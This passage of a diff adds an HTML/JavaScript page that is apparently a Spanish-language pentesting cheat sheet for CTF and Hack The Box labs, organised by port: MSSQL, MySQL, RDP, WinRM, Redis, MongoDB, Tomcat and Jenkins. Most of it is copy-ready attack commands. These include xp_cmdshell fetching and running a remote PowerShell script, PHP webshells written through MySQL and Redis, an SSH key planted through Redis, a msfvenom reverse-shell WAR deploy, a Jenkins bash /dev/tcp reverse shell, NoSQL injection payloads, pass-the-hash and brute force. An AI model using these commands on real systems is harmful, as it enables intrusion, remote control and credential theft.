+        raw: `impacket-mssqlclient SA:password@<IP>\ncrackmapexec mssql <IP> -u sa -p rockyou.txt`,
+        html: `impacket-mssqlclient <span class="vl">SA:password</span>@&lt;IP&gt;\ncrackmapexec mssql &lt;IP&gt; <span class="fl">-u</span> <span class="vl">sa</span> <span class="fl">-p</span> rockyou.txt`
+      },
+      {
+        label: 'RCE con xp_cmdshell',
+        raw: `-- Habilitar xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n\n-- Ejecutar comandos:\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'powershell -c "iex(iwr http://<IP>/shell.ps1)"';`,
+        html: `<span class="cm">-- Habilitar xp_cmdshell:</span>\nEXEC sp_configure <span class="vl">'show advanced options'</span>, 1; RECONFIGURE;\nEXEC sp_configure <span class="vl">'xp_cmdshell'</span>, 1; RECONFIGURE;\n\n<span class="cm">-- Ejecutar comandos:</span>\nEXEC xp_cmdshell <span class="vl">'whoami'</span>;\nEXEC xp_cmdshell <span class="vl">'powershell -c "iex(iwr http://&lt;IP&gt;/shell.ps1)"'</span>;`
+      }
+    ],
+    note: 'Si SA está activo y xp_cmdshell disponible → RCE inmediato como el usuario que corre el servicio MSSQL.'
+  },
+  {
+    port: '3306', proto: 'TCP', name: 'MySQL',
+    cats: ['db','lin'],
+    tags: [{t:'Brute force',c:'r'},{t:'File read',c:'a'},{t:'Webshell',c:'r'}],
+    attacks: [
+      'Brute force del usuario root (a veces sin contraseña)',
+      'LOAD_FILE() para leer ficheros del sistema operativo',
+      'INTO OUTFILE para escribir webshell en directorio web'
+    ],
+    cmds: [
+      {
+        label: 'Conexión remota',
+        raw: `mysql -u root -p -h <IP>\nmysql -u root --password="" -h <IP>   # sin pass`,
+        html: `mysql <span class="fl">-u</span> <span class="vl">root</span> <span class="fl">-p -h</span> &lt;IP&gt;\nmysql <span class="fl">-u</span> <span class="vl">root</span> <span class="fl">--password=</span><span class="vl">""</span> <span class="fl">-h</span> &lt;IP&gt;   <span class="cm"># sin pass</span>`
+      },
+      {
+        label: 'Leer ficheros del sistema',
+        raw: `SELECT LOAD_FILE('/etc/passwd');\nSELECT LOAD_FILE('/var/www/html/config.php');`,
+        html: `SELECT LOAD_FILE(<span class="vl">'/etc/passwd'</span>);\nSELECT LOAD_FILE(<span class="vl">'/var/www/html/config.php'</span>);`
+      },
+      {
+        label: 'Escribir webshell',
+        raw: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';`,
+        html: `SELECT <span class="vl">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>\nINTO OUTFILE <span class="vl">'/var/www/html/shell.php'</span>;`
+      }
+    ],
+    note: 'Si MySQL corre como root y tiene permisos en /var/www → escritura de webshell directa = RCE.'
+  },
+  {
+    port: '3389', proto: 'TCP', name: 'RDP',
+    cats: ['win'],
+    tags: [{t:'Brute force',c:'r'},{t:'Pass-the-Hash',c:'r'},{t:'BlueKeep',c:'r'}],
+    attacks: [
+      'Brute force de credenciales con Hydra',
+      'Pass-the-Hash con hash NTLM (Restricted Admin Mode)',
+      'BlueKeep CVE-2019-0708 en sistemas sin parchear'
+    ],
+    cmds: [
+      {
+        label: 'Conexión y brute force',
+        raw: `xfreerdp /u:admin /p:password /v:<IP>\nhydra -l Administrator -P rockyou.txt rdp://<IP> -t 4`,
+        html: `xfreerdp /u:<span class="vl">admin</span> /p:<span class="vl">password</span> /v:&lt;IP&gt;\nhydra <span class="fl">-l</span> <span class="vl">Administrator</span> <span class="fl">-P</span> rockyou.txt rdp://&lt;IP&gt; <span class="fl">-t</span> <span class="vl">4</span>`
+      },
+      {
+        label: 'Pass-the-Hash via RDP',
+        raw: `xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:<IP>`,
+        html: `xfreerdp /u:<span class="vl">Administrator</span> /pth:<span class="vl">&lt;NTLM_HASH&gt;</span> /v:&lt;IP&gt;`
+      },
+      {
+        label: 'BlueKeep check',
+        raw: `nmap --script rdp-vuln-ms12-020 -p 3389 <IP>\nuse auxiliary/scanner/rdp/cve_2019_0708_bluekeep`,
+        html: `nmap <span class="fl">--script</span> <span class="vl">rdp-vuln-ms12-020</span> <span class="fl">-p</span> <span class="vl">3389</span> &lt;IP&gt;\nuse auxiliary/scanner/rdp/cve_2019_0708_bluekeep`
+      }
+    ],
+    note: 'xfreerdp soporta Pass-the-Hash directamente con /pth:. BlueKeep es inestable — hacer snapshot antes de explotar.'
+  },
+  {
+    port: '5985 / 5986', proto: 'TCP', name: 'WinRM',
+    cats: ['win'],
+    tags: [{t:'Evil-WinRM',c:'g'},{t:'Pass-the-Hash',c:'r'}],
+    attacks: [
+      'Shell remota con evil-winrm si tienes credenciales válidas',
+      'Pass-the-Hash con hash NTLM',
+      'Credential spray desde lista de usuarios del dominio'
+    ],
+    cmds: [
+      {
+        label: 'Shell con credenciales',
+        raw: `evil-winrm -i <IP> -u usuario -p contraseña\nevil-winrm -i <IP> -u usuario -H <NTLM_HASH>`,
+        html: `evil-winrm <span class="fl">-i</span> &lt;IP&gt; <span class="fl">-u</span> <span class="vl">usuario</span> <span class="fl">-p</span> <span class="vl">contraseña</span>\nevil-winrm <span class="fl">-i</span> &lt;IP&gt; <span class="fl">-u</span> <span class="vl">usuario</span> <span class="fl">-H</span> <span class="vl">&lt;NTLM_HASH&gt;</span>`
+      },
+      {
+        label: 'Verificar si está activo',
+        raw: `crackmapexec winrm <IP> -u usuario -p pass\nnmap -p 5985,5986 <IP>`,
+        html: `crackmapexec winrm &lt;IP&gt; <span class="fl">-u</span> <span class="vl">usuario</span> <span class="fl">-p</span> <span class="vl">pass</span>\nnmap <span class="fl">-p</span> <span class="vl">5985,5986</span> &lt;IP&gt;`
+      }
+    ],
+    note: 'WinRM abierto + credenciales válidas = shell limpia. El usuario debe estar en "Remote Management Users".'
+  },
+  {
+    port: '6379', proto: 'TCP', name: 'Redis',
+    cats: ['db','lin'],
+    tags: [{t:'No auth',c:'r'},{t:'SSH key write',c:'r'},{t:'RCE',c:'r'}],
+    attacks: [
+      'Acceso sin autenticación (muy frecuente en CTF)',
+      'Escribir clave SSH pública para acceso directo como root',
+      'Webshell vía escritura en directorio web'
+    ],
+    cmds: [
+      {
+        label: 'Conectar y enumerar',
+        raw: `redis-cli -h <IP>\ninfo server\nkeys *\nget <key>`,
+        html: `redis-cli <span class="fl">-h</span> &lt;IP&gt;\n<span class="gn">info</span> server\n<span class="gn">keys</span> *\n<span class="gn">get</span> &lt;key&gt;`
+      },
+      {
+        label: 'Escribir SSH key (sin auth)',
+        raw: `# En tu máquina:\nssh-keygen -t rsa -f redis_key\n\n# En redis-cli:\nconfig set dir /root/.ssh/\nconfig set dbfilename authorized_keys\nset payload "\n\n$(cat redis_key.pub)\n\n"\nsave\n\n# Luego conectar:\nssh -i redis_key root@<IP>`,
+        html: `<span class="cm"># En tu máquina:</span>\nssh-keygen <span class="fl">-t</span> rsa <span class="fl">-f</span> redis_key\n\n<span class="cm"># En redis-cli:</span>\n<span class="gn">config set</span> dir /root/.ssh/\n<span class="gn">config set</span> dbfilename authorized_keys\n<span class="gn">set</span> payload <span class="vl">"\n\n$(cat redis_key.pub)\n\n"</span>\n<span class="gn">save</span>\n\n<span class="cm"># Luego conectar:</span>\nssh <span class="fl">-i</span> redis_key root@&lt;IP&gt;`
+      },
+      {
+        label: 'Webshell via Redis',
+        raw: `config set dir /var/www/html/\nconfig set dbfilename shell.php\nset payload '<?php system($_GET["cmd"]); ?>'\nsave`,
+        html: `<span class="gn">config set</span> dir /var/www/html/\n<span class="gn">config set</span> dbfilename shell.php\n<span class="gn">set</span> payload <span class="vl">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>\n<span class="gn">save</span>`
+      }
+    ],
+    note: 'Redis sin contraseña es muy común en HTB. Si corre como root → escritura de SSH key = root directo.'
+  },
+  {
+    port: '27017', proto: 'TCP', name: 'MongoDB',
+    cats: ['db','lin'],
+    tags: [{t:'No auth',c:'r'},{t:'Data dump',c:'a'},{t:'NoSQLi',c:'r'}],
+    attacks: [
+      'Acceso sin autenticación a todas las bases de datos',
+      'Dump de datos sensibles (usuarios, contraseñas en claro)',
+      'NoSQL Injection en aplicaciones web que usan MongoDB'
+    ],
+    cmds: [
+      {
+        label: 'Conectar y enumerar',
+        raw: `mongosh <IP>:27017\n# Dentro:\nshow dbs\nuse admin\nshow collections\ndb.users.find()`,
+        html: `mongosh &lt;IP&gt;:27017\n<span class="cm"># Dentro:</span>\nshow dbs\nuse admin\nshow collections\ndb.users.find()`
+      },
+      {
+        label: 'NoSQL Injection (HTTP)',
+        raw: `# JSON body:\n{"username": {"$ne": ""}, "password": {"$ne": ""}}\n\n# Con curl:\ncurl -X POST http://<IP>/login -H "Content-Type: application/json" \\\n  -d '{"user":{"$gt":""},"pass":{"$gt":""}}'`,
+        html: `<span class="cm"># JSON body:</span>\n{<span class="vl">"username"</span>: {<span class="vl">"$ne"</span>: <span class="vl">""</span>}, <span class="vl">"password"</span>: {<span class="vl">"$ne"</span>: <span class="vl">""</span>}}\n\n<span class="cm"># Con curl:</span>\ncurl <span class="fl">-X POST</span> http://&lt;IP&gt;/login <span class="fl">-H</span> <span class="vl">"Content-Type: application/json"</span> \\\n  <span class="fl">-d</span> <span class="vl">'{"user":{"$gt":""},"pass":{"$gt":""}}'</span>`
+      }
+    ],
+    note: 'MongoDB sin auth expone todas las DBs. En apps web, buscar parámetros que acepten JSON → NoSQL injection.'
+  },
+  {
+    port: '8080 / 8443', proto: 'TCP', name: 'HTTP Alt',
+    cats: ['web'],
+    tags: [{t:'Tomcat',c:'r'},{t:'Jenkins',c:'r'},{t:'Admin panels',c:'p'}],
+    attacks: [
+      'Paneles de administración con credenciales por defecto (Tomcat, Jenkins)',
+      'Deploy de WAR malicioso en Apache Tomcat',
+      'RCE via Script Groovy en consola de Jenkins'
+    ],
+    cmds: [
+      {
+        label: 'Tomcat — deploy WAR malicioso',
+        raw: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f war -o shell.war\ncurl -u tomcat:tomcat -T shell.war "http://<IP>:8080/manager/text/deploy?path=/shell"\ncurl http://<IP>:8080/shell/`,
+        html: `msfvenom <span class="fl">-p</span> java/jsp_shell_reverse_tcp <span class="fl">LHOST=</span>&lt;TU_IP&gt; <span class="fl">LPORT=</span>4444 <span class="fl">-f</span> war <span class="fl">-o</span> shell.war\ncurl <span class="fl">-u</span> <span class="vl">tomcat:tomcat</span> <span class="fl">-T</span> shell.war <span class="vl">"http://&lt;IP&gt;:8080/manager/text/deploy?path=/shell"</span>\ncurl http://&lt;IP&gt;:8080/shell/`
+      },
+      {
+        label: 'Jenkins — Groovy RCE',
+        raw: `# En Jenkins > Manage Jenkins > Script Console:\ndef cmd = "id".execute()\nprintln cmd.text\n\n# Reverse shell:\ndef cmd = "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'".execute()`,
+        html: `<span class="cm"># Jenkins &gt; Manage Jenkins &gt; Script Console:</span>\n<span class="kw">def</span> cmd = <span class="vl">"id"</span>.execute()\nprintln cmd.text\n\n<span class="cm"># Reverse shell:</span>\n<span class="kw">def</span> cmd = <span class="vl">"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1'"</span>.execute()`
+      },
+      {
+        label: 'Brute force panel admin',
+        raw: `hydra -l admin -P rockyou.txt http-post-form://<IP>:8080/login:"user=^USER^&pass=^PASS^:Invalid"`,
+        html: `hydra <span class="fl">-l</span> <span class="vl">admin</span> <span class="fl">-P</span> rockyou.txt http-post-form://&lt;IP&gt;:8080/login:<span class="vl">"user=^USER^&amp;pass=^PASS^:Invalid"</span>`
+      }
+    ],
+    note: 'Tomcat default creds: tomcat:tomcat, admin:admin. Jenkins sin auth en /script → RCE directo sin credenciales.'
+  }
+];
+
+const tagColors = {
+  r: 'ptag-r', g: 'ptag-g', a: 'ptag-a', b: 'ptag-b', p: 'ptag-p'
+};
+
+let activeFilter = 'all';
+let searchQuery = '';
+
+function getFiltered() {
+  return PORTS.filter(p => {
+    const matchCat = activeFilter === 'all' || p.cats.includes(activeFilter);
+    const q = searchQuery.toLowerCase();
+    const matchSearch = !q ||
+      p.port.includes(q) ||
+      p.name.toLowerCase().includes(q) ||
+      p.proto.toLowerCase().includes(q) ||
+      p.attacks.some(a => a.toLowerCase().includes(q)) ||
+      p.tags.some(t => t.t.toLowerCase().includes(q));
+    return matchCat && matchSearch;
+  });
+}
+
+function renderGrid() {
+  const grid = document.getElementById('grid');
+  const filtered = getFiltered();
+  document.getElementById('count').textContent = filtered.length;
+
+  if (!filtered.length) {
+    grid.innerHTML = '<div class="empty-state">Sin resultados para "' + searchQuery + '"</div>';
+    return;
+  }
+
+  grid.innerHTML = filtered.map((p, i) => `
+    <div class="port-card" id="card-${i}">
+      <div class="card-header" onclick="toggleCard(${i})">
+        <div class="port-badge">${p.port}</div>
+        <div class="card-header-info">
+          <div class="card-header-title">
+            <span class="port-name">${p.name}</span>
+            <span class="port-proto">${p.proto}</span>
+          </div>
+          <div class="port-tags">
+            ${p.tags.map(t => `<span class="ptag ${tagColors[t.c]}">${t.t}</span>`).join('')}
+          </div>
+        </div>
+        <span class="chevron">▶</span>
+      </div>
+      <div class="card-body">
+        <div class="atk-title">Vectores de ataque</div>
+        ${p.attacks.map(a => `
+          <div class="atk-item">
+            <div class="atk-dot"></div>
+            <span>${a}</span>
+          </div>
+        `).join('')}
+        ${p.cmds.map((cmd, ci) => `
+          <div class="cmd-block">
+            <div class="cmd-header">
+              <div class="cmd-dots"><span></span><span></span><span></span></div>
+              <span class="cmd-label-text">${cmd.label}</span>
+              <button class="copy-btn" onclick="copyRaw(this, ${i}, ${ci})">copiar</button>
+            </div>
+            <pre>${cmd.html}</pre>
+          </div>
+        `).join('')}
+        ${p.note ? `<div class="note-box">💡 ${p.note}</div>` : ''}
+      </div>
+    </div>
+  `).join('');
+}
+
+function toggleCard(i) {
+  const card = document.getElementById('card-' + i);
+  card.classList.toggle('expanded');
+}
+
+function doFilter(cat, btn) {
+  activeFilter = cat;
+  document.querySelectorAll('.filter-btn').forEach(b => {
+    b.className = 'filter-btn';
+  });
+  btn.classList.add('active-' + cat);
+  renderGrid();
+}
+
+function doSearch(val) {
+  searchQuery = val;
+  renderGrid();
+}
+
+function copyRaw(btn, portIdx, cmdIdx) {
+  const filtered = getFiltered();
+  const port = filtered[portIdx];
+  if (!port) return;
+  const raw = port.cmds[cmdIdx].raw;
+  navigator.clipboard.writeText(raw).catch(() => {});
+  btn.textContent = '✓ ok';
+  setTimeout(() => btn.textContent = 'copiar', 1500);
+}
+
+renderGrid();
+</script>
+</body>
+</html>
